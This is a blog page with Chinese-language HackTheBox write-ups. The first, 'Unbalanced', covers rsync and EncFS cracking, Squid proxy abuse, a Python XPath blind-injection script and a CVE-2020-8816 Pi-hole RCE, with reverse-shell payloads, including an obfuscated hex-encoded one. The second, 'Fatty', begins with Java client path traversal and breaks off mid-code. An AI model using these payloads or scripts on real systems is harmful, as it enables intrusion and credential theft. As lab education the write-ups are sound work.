(ED25519)873/tcp open rsync (protocol version 31)3128/tcp open http-proxy Squid http proxy 4.6|_http-server-header: squid/4.6|_http-title: ERROR: The requested URL could not be retrievedService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Aug 7 11:03:34 2020 -- 1 IP address (1 host up) scanned in 98.87 seconds 873有rsync.3128有squid。既然rsync开放,在htb这种环境里肯定存在未授权访问的。所以探测并下载下来。 123root@byc404:~/htb/boxes/Unbalanced/# rsync 10.10.10.200::conf_backups EncFS-encrypted configuration backupsroot@byc404:~/htb/boxes/Unbalanced/# rsync 192.168.122.1::conf_backups ./rsync_backup 得到conf_backups文件夹。看下内容 1234567891011121314151617root@byc404:~/htb/boxes/Unbalanced/rsync_backup# ls -la-rw-r--r-- 1 root root 2980 Apr 4 23:05 A4qOD1nvqe9JgKnslwk1sUzO -rw-r--r-- 1 root root 1138 Apr 4 23:05 a4zdmLrBYDC24s9Z59y-Pwa2 -rw-r--r-- 1 root root 443 Apr 4 23:05 Acv0PEQX8vs-KdK307QNHaiF -rw-r--r-- 1 root root 935 Apr 4 23:05 B6J5M3OP0X7W25ITnaZX753T -rw-r--r-- 1 root root 3643 Apr 4 23:05 c9w3APbCYWfWLsq7NFOdjQpA -rw-r--r-- 1 root root 288 Apr 4 23:05 ,CBjPJW4EGlcqwZW4nmVqBA6 -rw-r--r-- 1 root root 1521 Apr 4 23:05 Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1 -rw-r--r-- 1 root root 332 Apr 4 23:05 cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1 -rw-r--r-- 1 root root 2592 Apr 4 23:05 dF2GU58wFl3x5R7aDE6QEnDj -rw-r--r-- 1 root root 1268 Apr 4 23:05 dNTEvgsjgG6lKBr8ev8Dw,p7 -rw-r--r-- 1 root root 2359 Apr 4 23:05 ECXONXBBRwhb5tYOIcjjFZzh -rw-r--r-- 1 root root 1297 Apr 2 21:06 .encfs6.xml -rw-r--r-- 1 root root 1464 Apr 4 23:05 F4F9opY2nhVVnRgiQ,OUs-Y0 -rw-r--r-- 1 root root 354 Apr 4 23:05 FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1..... 发现文件名似乎都是处理过的hashstring.有个.encfs6.xml但是内容看不出什么敏感数据。 google搜索了下发现这是encfs加密得到配置文件。encfs加密的用法简单来说,就是你可以指定一个被加密的文件夹,再mount另一个文件夹作为加密文件夹。执行encfs后,被加密的文件夹的内容以及文件名就在加密文件夹就会自动生成。此时加密文件夹会留下一个.encfs6.xml 这种情况经常出现在使用自动同步的情况里面。因为encfs一旦为两个文件夹建立了映射,就会自动加密新放入的文件。正因如此,使用rsync处理encfs加密后的文件夹也是一种常见选择。而一旦出现了rsync未授权访问就将导致进一步的信息泄露。实战中完全可能。 至于解密方法其实安装了encfs后看一下man就懂了。我在--reverse的选项那看到了一种逆向两个encfs文件夹的做法。因此只需要一个正确的encfs 密码即可。(encfs每次调用加密建立映射时会要求你输入密码)接着查资料。我发现encfs如果有.encfs6.xml的话。可以直接使用john爆破https://security.stackexchange.com/questions/98205/breaking-encfs-given-encfs6-xml 先使用encfs2john.py转换。然后爆破即可 结果$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add:bubblegum bubblegum就是encfs密码。然后解密文件夹。把解密的文件夹放到rsync_decrypt里去。注意这里的路径只接受绝对路径。 1ENCFS6_CONFIG=/root/htb/boxes/Unbalanced/rsync_backup/.encfs6.xml encfs /root/htb/boxes/Unbalanced/rsync_backup /root/htb/boxes/Unbalanced/rsync_decrypt 得到解密文件夹后。发现有几十个conf文件。基本就是平时会放到/etc下的那些.conf文件。 这里明显需要抓重点。基于之前我们探测时发现有squid代理开放。所以找到squid.conf。squid.conf同样要抓重点。因为里面有上千行内容。比较方便的方法是直接cat squid.conf| grep htb找到一个域名。或者后来我拿到本机上用vscode看时因为注释部分跟未注释部分有明显的绿色与白色差别。所以可以很快拖着看。找到所有关键信息。 123456789101112131415161718192021222324# Only allow cachemgr access from localhost#http_access allow localhost manager#http_access deny managerhttp_access allow manager#http_access allow localnethttp_access allow localhost# Allow access to intranetacl intranet dstdomain -n intranet.unbalanced.htbacl intranet_net dst -n 172.16.0.0&#x2F;12http_access allow intranethttp_access allow intranet_net# cachemgr_passwd secret shutdown# cachemgr_passwd lesssssssecret info stats&#x2F;objects# cachemgr_passwd disable all#Default:# No password. Actions which require password are denied.cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf eventscachemgr_passwd disable all 几个关键点。 intranet.unbalanced.htb 域名。不过是内网ip cachemgr_passwd 即cache manager的密码Thah$Sh1 只能本地访问 那就很明显了。我们之前namp也没有找到squid以外的web服务。既然如此,直接使用它这个代理服务器作代理就能访问内网网页了。 修改浏览器的代理改为10.10.10.200:3128.再次访问intranet.unbalanced.htb 现在我们可以访问到页面.它会重定向我们到/inranet.php。不过这个登录界面没啥东西。可能需要进一步利用。唯一稍微泄露出相关信息的内容在headers里 这时想起我们之前的cache manager密码。搜索一波如何利用。 The cache manager (cachemgr.cgi) is a CGI utility for displaying statistics about the squid process as it runs 简单看下发现我们是可以调用cachemgr的命令的。之前在squid.conf中跟在密码后的一大组文字其实就是各种可调用的命令。搜索了下调用方式。发现可以telnet连接代理服务器然后再传一个http报头。不过后来找到一个debian就有的squidclient命令行.更加方便。我们先调用下menu命令。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768 root@byc404:~/htb/boxes/Unbalanced# squidclient -h 10.10.10.200 -w 'Thah$Sh1' mgr:menu HTTP/1.1 200 OK Server: squid/4.6 Mime-Version: 1.0 Date: Sat, 15 Aug 2020 02:17:42 GMT Content-Type: text/plain;charset=utf-8 Expires: Sat, 15 Aug 2020 02:17:42 GMT Last-Modified: Sat, 15 Aug 2020 02:17:42 GMT X-Cache: MISS from unbalanced X-Cache-Lookup: MISS from unbalanced:3128 Via: 1.1 unbalanced (squid/4.6) Connection: close index Cache Manager Interface disabled menu Cache Manager Menu protected offline_toggle Toggle offline_mode setting disabled shutdown Shut Down the Squid Process disabled reconfigure Reconfigure Squid disabled rotate Rotate Squid Logs disabled pconn Persistent Connection Utilization Histograms protected mem Memory Utilization protected diskd DISKD Stats protected squidaio_counts Async IO Function Counters disabled config Current Squid Configuration disabled client_list Cache Client List disabled comm_epoll_incoming comm_incoming() stats disabled ipcache IP Cache Stats and Contents disabled fqdncache FQDN Cache Stats and Contents protected idns Internal DNS Statistics disabled redirector URL Redirector Stats disabled store_id StoreId helper Stats disabled external_acl External ACL stats disabled http_headers HTTP Header Statistics disabled external_acl External ACL stats disabled http_headers HTTP Header Statistics disabled info General Runtime Information disabled service_times Service Times (Percentiles) disabled filedescriptors Process Filedescriptor Allocation protected objects All Cache Objects protected vm_objects In-Memory and In-Transit Objects protected io Server-side network read() size histograms disabled counters Traffic and Resource Counters protected peer_select Peer Selection Algorithms disabled digest_stats Cache Digest and ICP blob disabled 5min 5 Minute Average of Counters protected 60min 60 Minute Average of Counters protected utilization Cache Utilization disabled histograms Full Histogram Counts protected active_requests Client-side Active Requests disabled username_cache Active Cached Usernames disabled openfd_objects Objects with Swapout files open disabled store_digest Store Digest disabled store_log_tags Histogram of store.log tags disabled storedir Store Directory Stats disabled store_io Store IO Interface Stats disabled store_check_cachable_stats storeCheckCachable() Stats disabled refresh Refresh Algorithm Statistics disabled delay Delay Pool Levels disabled forward Request Forwarding Statistics disabled cbdata Callback Data Registry Contents protected sbuf String-Buffer statistics protected events Event Queue protected netdb Network Measurement Database disabled asndb AS Number Database disabled carp CARP information disabled userhash peer userhash information disabled sourcehash peer sourcehash information disabled server_list Peer Cache Statistics disabled 可以看到除了squid配置中已经标出的可用命令外,其他都是disabled的。所以我们依次调用下寻找关键信息。在调用到fqdncache时 123456789101112131415161718192021FQDN Cache Statistics:FQDNcache Entries In Use: 13FQDNcache Entries Cached: 11FQDNcache Requests: 12782FQDNcache Hits: 0FQDNcache Negative Hits: 7080FQDNcache Misses: 5702FQDN Cache Contents:Address Flg TTL Cnt Hostnames10.10.14.6 N -16959 0127.0.1.1 H -001 2 unbalanced.htb unbalanced::1 H -001 3 localhost ip6-localhost ip6-loopback172.31.179.2 H -001 1 intranet-host2.unbalanced.htb172.31.179.3 H -001 1 intranet-host3.unbalanced.htb10.10.10.200 N -1086 0127.0.0.1 H -001 1 localhost172.17.0.1 H -001 1 intranet.unbalanced.htbff02::1 H -001 1 ip6-allnodesff02::2 H -001 1 ip6-allrouters10.10.14.65 N 025 0 看到intranet-host3.unbalanced.htb及对应的ip。不难想到内网里可能还有其他服务。这里先访问172.31.179.2与172.31.179.3.发现会被重定向到/inranet.php也就是跟之前同样的网页。但是顺着访问172.31.179.1时 没有出现重定向。这种怪异行为值得重视。我们再次访问172.31.179.1/intranet.php。这次尝试登录时,会发现它会回显Invalid credentials..也就是说可以跟服务交互了。 既然如此肯定就要在登录参数作文章。无非不就是sqli那一套。简单尝试后发现密码处存在注入.当以abc&#39; or &#39;1&#39;=&#39;1作为密码时会回显四个用户名与对应邮箱。 123456789101112131415161718192021222324252627 ritaRita Fubellirita@unbalanced.htbRole: HR ManagerjimJim Mickelsonjim@unbalanced.htbRole: Web DesignerbryanBryan Angstrombryan@unbalanced.htbRole: System AdministratorsarahSarah Goodmansarah@unbalanced.htbRole: Team Leader bryan是Administrator.说明很有可能就是需要他的信息。不过这里有个细节上需要注意下。当我尝试如abc&#39; or 1=1#这样的payload不可行,abc&#39; or substr(&#39;abc&#39;,1,1)=&#39;a也不可行。但是abc&#39; or substring(&#39;abc&#39;,1,1)=&#39;a是回显了真值的。那么这里真的是sql注入吗？答案是否定的。我很快联想到曾经在npuctf中出现过一次的xpath注入。加上这里并没有执行所谓的登录操作，而是在界面回显html块内容。我可以判断,这里应该是一个xpath注入而不是sql注入。 xpath来盲注的话。比起sql布尔盲注更加简单 12345678910111213141516171819202122import requestsimport stringURL='http://172.31.179.1/intranet.php'proxies=&#123;'http':\"10.10.10.200:3128\"&#125;users=&#123;'bryan','rita','jim','sarah'&#125;for user in users: password=\"\" print(user) for i in range(1,30): a=0 print(i) for j in string.printable: data=&#123;\"Username\":\"a\",\"Password\":\"' or Username='\"+user+\"' and substring(Password,\"+str(i)+\",1)='\"+j+\"\"&#125; r=requests.post(URL,data=data,proxies=proxies) if len(r.text) &gt; 7000: password+=j a=1 print(password) break if a==0: break 简单写个盲注脚本,注意要挂它的proxy。这里优先跑bryan的密码。因为远程实在太慢了……幸好bryan就是系统用户。使用它的密码即可ssh登录。 其他人的密码后来花些时间也跑出来了。 1234bryan:ireallyl0vebubblegum!!!rita:password01!jim:stairwaytoheavensarah:sarah4evah bryan登录上去就能拿到user.txt了。 简单说这一部分其实难度真的一般。主要是使用它给的proxy这步可能有的人没做过。但是假如利用好rsync得到的conf就能很快知道这点。所以难度一般。后面比较迷惑的还是xpath与sqli不能混淆。不过通过简单的fuzz还是能判断出来的。 privesc to rootbryan文件夹下有一个TODO 123456789101112131415161718192021############# Intranet #############* Install new intranet-host3 docker [DONE]* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]* Test intranet-host3 [DONE]* Add intranet-host3 to load balancer [DONE]* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]* Fix intranet-host2 [DONE]* Re-add intranet-host2 to load balancer (set default weight) [DONE]- Fix intranet-host1 [TODO]- Re-add intranet-host1 to load balancer (set default weight) [TODO]############ Pi-hole ############* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]* Set temporary admin password [DONE]* Create Pi-hole configuration script [IN PROGRESS]- Run Pi-hole configuration script [TODO]- Expose Pi-hole ports to the network [TODO] 从这里可以看出。靶机上已经跑好了一个docker。但是它是跑在127。0.0.1的。并且有个admin密码。Pi-hole 配置文件尚未完成。 ss -lntp看下端口 1234567891011bryan@unbalanced:~$ ss -lntpState Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 5 0.0.0.0:873 0.0.0.0:* LISTEN 0 128 127.0.0.1:8080 0.0.0.0:* LISTEN 0 128 127.0.0.1:5553 0.0.0.0:* LISTEN 0 32 0.0.0.0:53 0.0.0.0:* LISTEN 0 128 0.0.0.0:22 0.0.0.0:* LISTEN 0 5 [::]:873 [::]:* LISTEN 0 32 [::]:53 [::]:* LISTEN 0 128 [::]:22 [::]:* LISTEN 0 128 *:3128 *:* 8080与5553明显是跑在本地上的。其中8080可以curl到。不过会提醒我们hostname不对。 既然是个web服务。那先端口转发到本地看看长什么样。我们直接用ssh转发 12~C #进入ssh命令行-L 8080:127.0.0.1:8080 增加一个Host: unbalanced 再次暴露了一个pihole.unbalanced.htb.以及对应的内网ip. 访问这个pihole的后台/admin.因为之前提示过我们temporary admin password .所以用admin就能登入。进去后发现是个4.3.2版本的pihole. 暂时没思路。不过搜索下发现版本在CVE-2020-8816可用范围内。这个是可以直接rce拿到www-data的shell的。虽然跟我们提权root没啥关系。但是不妨一试。用这的exphttps://github.com/AndreyRainchik/CVE-2020-8816 因为我们已经转发好端口了。所以直接打就是了python3 CVE-2020-8816.py http://127.0.0.1:8080 admin 10.10.14.11 90001 www-data的话肯定得继续收集信息了。但是我意想不到的是www-data居然可以直接进这个docker的root目录……简直可怕。然后里面有之前提到的config文件 1234567891011121314151617181920#!/bin/bash# Add domains to whitelist/usr/local/bin/pihole -w unbalanced.htb/usr/local/bin/pihole -w rebalanced.htb# Set temperature unit to Celsius/usr/local/bin/pihole -a -c# Add local host record/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1# Set privacy level/usr/local/bin/pihole -a -l 4# Set web admin interface password/usr/local/bin/pihole -a -p 'bUbBl3gUm$43v3Ry0n3!'# Set admin email/usr/local/bin/pihole -a email admin@unbalanced.htb admin的密码又是一个跟bubblegum有关的……试了下ssh登录root没成。su一下居然就成了…… 怎么说呢。提权这块只要nday poc就能拿www-data =&gt; 然后就可以进root目录=&gt; 然后系统密码直接就暴露出来了。这一连串操作令人窒息。有点刻意而且让这台靶机的体验直接降了一个档次。所以没啥总结的。 CVE-2020-8816因为后面没什么收获，所以简单看了下这个cve。发现还挺有意思的。 https://xz.aliyun.com/t/7511 首先。pihole有这样一个功能设置静态DHCP，将IP地址固定到给定的MAC地址上而他的源码里调用了命令执行拼接 12345if(!strlen($error))&#123; exec(\"sudo pihole -a addstaticdhcp \".$mac.\" \".$ip.\" \".$hostname); $success .= \"A new static address has been added\";&#125; 既然是拼接。假如没有过滤到位那就肯定可以绕过。我们看下它主要的过滤方式。 1234567891011121314151617function validMAC($mac_addr)&#123; // Accepted input format: 00:01:02:1A:5F:FF (characters may be lower case) return (preg_match('/([a-fA-F0-9]&#123;2&#125;[:]?)&#123;6&#125;/', $mac_addr) == 1); &#125;......$mac = $_POST[\"AddMAC\"]; $ip = $_POST[\"AddIP\"];$hostname = $_POST[\"AddHostname\"];if(!validMAC($mac))&#123; $error .= \"MAC address (\".htmlspecialchars($mac).\") is invalid!&lt;br&gt;\";&#125;$mac = strtoupper($mac); 这个正则写的并不正确。比如我们直接使用aaaaaaaaaaaa就能通过校验。甚至可以在后面加上任意shell代码 12var_dump(validMAC('aaaaaaaaaaaa&amp;&amp;php -r \\'$sock=fsockopen(\"10.1.0.9\",2256);exec(\"bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");\\''));//bool(true) 不过唯一重点就是。他对我们的输入调用了htmlspecialchars以及strtoupper.后者比较关键。 这时首先就考验利用的php技巧了。因为合法的mac后面跟任意语句都是可以的。那自然我们选择php代码执行函数。(php自带函数不区分大小写)。使用EXEC(HEX2BIN(xxxxx...))即可以执行任意代码。接下来重点就是绕过被变成大写的php -r了。 这一步就用到系统命令执行的绕过技巧了。假如我们使用aaaaaaaaaaaa$PATH.系统是会返回PATH变量的 1&#x2F;opt&#x2F;pihole:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin 而其中pihole,usr正好可以构造出p h r这几个字母。所以我们使用 123456W&#x3D;$&#123;PATH#&#x2F;???&#x2F;&#125;P&#x3D;$&#123;W%%?????:&#125;X&#x3D;$&#123;PATH#&#x2F;???&#x2F;??&#125;H&#x3D;$&#123;X%%???:&#125;Z&#x3D;$&#123;PATH#:&#x2F;??&#125;R&#x3D;$&#123;Z%%&#x2F;&#125; 简单举个例子。基本上就是利用linux通配符来进行构造。十分精妙 123root@pihole:&#x2F;# W&#x3D;$&#123;PATH#&#x2F;???&#x2F;&#125;&amp;&amp;P&#x3D;$&#123;W%%?????:*&#125;&amp;&amp;echo $W &amp;&amp; echo $Ppihole:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;binp 最后以类似的payload命令执行 1aaaaaaaaaaaa&amp;&amp;W&#x3D;$&#123;PATH#&#x2F;???&#x2F;&#125;&amp;&amp;P&#x3D;$&#123;W%%?????:*&#125;&amp;&amp;X&#x3D;$&#123;PATH#&#x2F;???&#x2F;??&#125;&amp;&amp;H&#x3D;$&#123;X%%???:*&#125;&amp;&amp;Z&#x3D;$&#123;PATH#*:&#x2F;??&#125;&amp;&amp;R&#x3D;$&#123;Z%%&#x2F;*&#125;&amp;&amp;$P$H$P$IFS-$R$IFS&#39;EXEC(HEX2BIN(&quot;706870202D72202724736F636B3D66736F636B6F70656E282231302E312E302E39222C32323536293B6578656328222F62696E2F7368202D69203C2633203E263320323E263322293B27&quot;));&#39;&amp;&amp; summary前面很有趣。后面很简单。不过如果深入研究这个cve的话还是比较有收获的。","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"Linux","slug":"Linux","permalink":"https://www.bycsec.top/tags/Linux/"}]},{"title":"hackthebox-Fatty-JavaExploits","slug":"hackthebox-Fatty-JavaExploits","date":"2020-08-10T02:13:15.000Z","updated":"2021-02-18T05:09:16.155Z","comments":true,"path":"2020/08/10/hackthebox-Fatty-JavaExploits/","link":"","permalink":"https://www.bycsec.top/2020/08/10/hackthebox-Fatty-JavaExploits/","excerpt":"Faaty 是htb这周刚退役的靶机。本来一周前自己打算下手试试的,不过做了一会发现因为即将退役就干脆搁置等ippsec出视频自己再做233. 不过整体来说这台靶机真的非常有趣。并且涉及到大量的java知识。在这一次实际操作中自己才真正体会到前段时间巩固java开发的基础知识有多么重要。因此这里记录下具体操作的流程,将学到的新知识巩固一下。","text":"Faaty 是htb这周刚退役的靶机。本来一周前自己打算下手试试的,不过做了一会发现因为即将退役就干脆搁置等ippsec出视频自己再做233. 不过整体来说这台靶机真的非常有趣。并且涉及到大量的java知识。在这一次实际操作中自己才真正体会到前段时间巩固java开发的基础知识有多么重要。因此这里记录下具体操作的流程,将学到的新知识巩固一下。 当然。这次实际操作途中还是有一处困扰着我的地方没有找到好的答案。就是idea中能否重新导入单个java文件并修改引入jar包中class的内容。 靶机ip: 10.10.10.174 攻击机: 10.10.14.25 initial-foothold to user首先nmap简单扫的结果只有21,22端口。21端口允许匿名登录。其中有4个文件。一个jar包与三个note note.txt 1234Dear members, because of some security issues we moved the port of our fatty java server from 8000 to the hidden and undocumented port 1337. Furthermore, we created two new instances of the server on port 1338 and 1339. They offer exactly the same server and it would be nice if you use different servers from day to day to balance the server load. We were too lazy to fix the default port in the &#39;.jar&#39; file, but since you are all senior java developers you should be capable of doing it yourself ;)Best regards, qtc 从这里我们可以看到。远程应该开放了1337,1338,1339端口来作为服务端。然后我们自己用jar包当客户端。 同时这里涉及到一个java thick client的概念。简单说就是数据处理有很大一部分由客户端完成。 note2 1234Dear members, we are currently experimenting with new java layouts. The new client uses a static layout. If your are using a tiling window manager or only have a limited screen size, try to resize the client window until you see the login from.Furthermore, for compatibility reasons we still rely on Java 8. Since our company workstations ship Java 11 per default, you may need to install it manually.Best regards, qtc note2 提示我们使用java8. note3 1234Dear members, We had to remove all other user accounts because of some seucrity issues. Until we have fixed these issues, you can use my account:User: qtc Pass: clarabibiBest regards, qtc note3则直接提供给我们一组可行的账号。至此note已经看完。ftp服务上还剩下一个fatty-client.jar。我们下载下来进行审计 开始我是直接拿到本机的idea上看jar包的。首先结构上应该是spring框架编写功能+swing组件编写gui。但是并没有太大收获。比如常见如readObject这样的反序列化函数我并没有见到。但是却有writeObject存在。说明可能readObject这一操作是在服务端进行的。那么我们还是先尝试直接使用这个jar包。看看哪里有漏洞可寻。 首先注意,题目要求环境java8。所以kali可以很好的解决这个问题。我们直接使用/usr/lib/jvm/java-8-openjdk-amd64/bin/java调用jar包即可。 从界面以及源码都能看出来这是一个用java swing组件写出来的gui界面。 首先尝试登录。但不出所料果然回显Connection Error。这点我们从jar包的beans.xml可以看出 123456789101112131415161718192021222324252627282930&lt;?xml version = \"1.0\" encoding = \"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\" http://www.springframework.org/schema/beans spring-beans-3.0.xsd\"&gt;&lt;!-- Here we have an constructor based injection, where Spring injects required arguments inside the constructor function. --&gt; &lt;bean id=\"connectionContext\" class = \"htb.fatty.shared.connection.ConnectionContext\"&gt; &lt;constructor-arg index=\"0\" value = \"server.fatty.htb\"/&gt; &lt;constructor-arg index=\"1\" value = \"8000\"/&gt; &lt;/bean&gt; &lt;!-- The next to beans use setter injection. For this kind of injection one needs to define an defaultconstructor for the object (no arguments) and one needs to define setter methods for the properties. --&gt; &lt;bean id=\"trustedFatty\" class = \"htb.fatty.shared.connection.TrustedFatty\"&gt; &lt;property name = \"keystorePath\" value = \"fatty.p12\"/&gt; &lt;/bean&gt; &lt;bean id=\"secretHolder\" class = \"htb.fatty.shared.connection.SecretHolder\"&gt; &lt;property name = \"secret\" value = \"clarabibiclarabibiclarabibi\"/&gt; &lt;/bean&gt;&lt;!-- For out final bean we use now again constructor injection. Notice that we use now ref instead of val --&gt; &lt;bean id=\"connection\" class = \"htb.fatty.client.connection.Connection\"&gt; &lt;constructor-arg index = \"0\" ref = \"connectionContext\"/&gt; &lt;constructor-arg index = \"1\" ref = \"trustedFatty\"/&gt; &lt;constructor-arg index = \"2\" ref = \"secretHolder\"/&gt; &lt;/bean&gt;&lt;/beans&gt; bean的配置中存在server.fatty.htb 并配置端口8000.因此我们需要将这个hostname加入/etc/hosts.不过此处我们有两种方法。一种是直接更改jar包并重新使用。另一种是使用代理转发下流量。我因为偷懒选择了第二种。 即,在hosts 文件中设置为127.0.0.1 server.fatty.htb并使用socat转发本地8000的流量到10.10.10.147:1337上 1socat TCP-LISTEN:8000,fork TCP:10.10.10.174:1337 当然。第一种方法也是可行的。但是实际非常麻烦。假如我们只是解压jar包，更改beans.xml再重新压缩位jar包的话jar -uf fatty-client.jar beans.xml。再次运行将会发现出现java security problems。为什么呢？这是因为整个jar包中有部分配置文件会因为sha256变化的beans.xml出错,这跟java seal 的操作有关。一旦相关文件变化，将导致抛出Sealing Violation。所以我们必须删掉内容中记录了sha256值的文件并设定配置。 操作方法METAINF/MANIFEST.MF 中底下所有sha256相关内容全部去掉，同时上面设置中Sealed: True这一行去掉。 123456Manifest-Version: 1.0 Archiver-Version: Plexus Archiver Built-By: root Created-By: Apache Maven 3.3.9 Build-Jdk: 1.8.0_232 Main-Class: htb.fatty.client.run.Starter 接着删掉META-INF/1.RSA META-INF/1.SF 两个同样含有sha256值的文件。重新更新jar包文件即可。(或者直接zip打包) 当然。虽然我开始没有进行这步操作,后面还是一样要做的。 然后现在我们可以跟服务进行交互了。使用直接note中qtc:clarabibi成功登录后。试了一下几个操作发现还是没有什么收获。我们所在的用户组有ping,whoami,configs这样几个操作。其中configs执行的似乎是服务端列目录的工作。gui底下有一个按钮open,可以输入对应文件名读取服务端目录的文件。尝试open功能时fuzz触发了报错 似乎..这样的操作可以进行一,两层路径穿越。但是并不能达成任意列目录。因为它过滤了../..。 看了下源码。列目录对应的应该是这里Invoker中的showfiles 12345678910111213public String showFiles(String folder) throws MessageParseException, MessageBuildException, IOException &#123; String methodName = (new Object() &#123; &#125;).getClass().getEnclosingMethod().getName(); logger.logInfo(\"[+] Method '\" + methodName + \"' was called by user '\" + this.user.getUsername() + \"'.\"); if (AccessCheck.checkAccess(methodName, this.user)) &#123; return \"Error: Method '\" + methodName + \"' is not allowed for this user account\"; &#125; else &#123; this.action = new ActionMessage(this.sessionID, \"files\"); this.action.addArgument(folder); this.sendAndRecv(); return this.response.hasError() ? \"Error: Your action caused an error on the application server!\" : this.response.getContentAsString(); &#125;&#125; 而我们gui中对应configs的操作是 可见。此处原本设定了目录为configs.但倘若我们修改其为..是否就能路径穿越了呢？不妨一试。参照ippsec视频,这里我们为了方便节省手动操作时间,而不是反复修改源码重新build jar包(然而打脸了,后面重新build了两次……)不如直接导入jar包并编写exp. 于是这里我去下了一个linux 上的idea.不得不吐槽配置ide环境居然也出了小问题 =&gt; idea无法自动识别/usr/lib/jvm中的jdk.必须执行sudo apt-get install openjdk-8-jdk后。idea才能自动识别jvm中的java8. 我们创建一个环境为java8的工程。并在library中导入fatty-client.jar。 按照ippsec的思路简单写一个利用exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import htb.fatty.client.connection.Connection;import htb.fatty.client.methods.Invoker;import htb.fatty.shared.message.MessageBuildException;import htb.fatty.shared.message.MessageParseException;import htb.fatty.shared.resources.User;import java.io.IOException;public class exploit &#123; public static void main(String[] args) throws IOException&#123; Connection conn = null; try &#123; conn = Connection.getConnection(); &#125;catch(Exception e)&#123; System.out.println(\"[-] connection failed\"+e.getMessage()); System.exit(1); &#125; System.out.println(\"[+] Successfully connected\"); User user=new User(\"qtc\",\"clarabibi\"); if(conn.login(user))&#123; System.out.println(\"[+] Successfully logged in\"); &#125;else&#123; System.out.println(\"[-] Login failed\"); &#125; String rolename=conn.getRoleName(); user.setRoleByName(rolename); System.out.println(\"[+] rolename is: \"+rolename); /* Invoker invoker =new Invoker(conn,user); String response=\"\"; try &#123; response=invoker.showFiles(\"..\"); &#125; catch (MessageParseException e) &#123; e.printStackTrace(); &#125; catch (MessageBuildException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; System.out.println(\"Server response:\\n\"+ response); */ &#125;&#125; 这样我们就能通过java代码来跟服务端交互了。同时比较方便的是。我们可以直接修改传入的值来节省时间比如上面代码注释的部分即是invoker调用showFiles方法并获取回显。并且我们直接就可以修改传入的参数为..进行路径穿越.得到以下文件。(try catch 直接用idea快捷键添加即可。非常方便) 123456Server response:logstarstart.shfatty-server.jarfiles 接下来使用open方法读文件。我们把invoker调用的方法改为open(&quot;..&quot;,&quot;start.sh&quot;) 123456789101112131415#!/bin/sh# Unfortunately alpine docker containers seems to have problems with services.# I tried both, ssh and cron to start via openrc, but non of them worked. Therefore, # both services are now started as part of the docker startup script.# Start cron servicecrond -b# Start ssh server/usr/sbin/sshd# Start Java application serversu - qtc /bin/sh -c \"java -jar /opt/fatty/fatty-server.jar\" 看来服务端运行的就是fatty-server.jar了.为了搞清楚服务端究竟做了什么操作。比如为什么我们用户组user权限有些方法调用不了,要怎么变为admin权限。服务端是否又调用了readObject呢？这些都需要对server的源码审计。 然而问题在于。我们并没有办法利用现有的方法获取服务jar包的完整数据。因为open方法调用的是 12345try &#123; response = this.response.getContentAsString();&#125; catch (Exception var6) &#123; response = \"Unable to convert byte[] to String. Did you read in a binary file?\";&#125; 即使不知道服务端是怎么读文件的。但是我们知道回显的内容是对this.respoonse调用getContentAsString()来将内容转为字符串。那么读取jar包这种二进制文件时必然会有不可见字符被直接忽视。导致我们获取的文件不完整。那么必须重写open方法。让它能直接将response内容写进本机。 然后这里就是比较头疼的一处了。我知道eclipse可以直接import 现有一个java文件作依赖然后重写调用(前提是执行了前面的unseal过程。即删除了rsa,sf,修改了mf)。但是idea我一直没找到好的调用方法。希望有大佬能教教我idea怎么处理最优….. 总之最后。我选择了直接重写代码再build jar包的方法。虽然有点蠢但是至少可行。首先我们直接获取文件内容并写入。因此在open方法中加入以下代码。 当然直接新创建一个方法写文件并在exp中使用invoker调用也是可以的。 然后就是这次学到的命令行下重新build一个jar包的完整流程 12345678javac -cp fatty-client.jar htb/fatty/client/methods/Invoker.javamkdir raw cp fatty-client.jar raw/fatty-client.jar cd raw &amp;&amp; unzip fatty-client.jar......mv htb/fatty/client/methods/*.class raw/htb/fatty/client/methods/cd raw &amp;&amp; jar -cmf META-INF/MANIFEST.MF fatty.jar . 比较闹心的是。因为之前用idea自动反编译的内容,导致源码的java文件找不到。我还得重新反编译一下jar包……然后修改Invoker.java。 123456789101112131415161718192021222324252627282930313233343536import java.io.FileOutputStream;...... public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException &#123; String methodName = (new Object() &#123; &#125;).getClass().getEnclosingMethod().getName(); logger.logInfo(\"[+] Method '\" + methodName + \"' was called by user '\" + this.user.getUsername() + \"'.\"); if (AccessCheck.checkAccess(methodName, this.user)) &#123; return \"Error: Method '\" + methodName + \"' is not allowed for this user account\"; &#125; else &#123; this.action = new ActionMessage(this.sessionID, \"open\"); 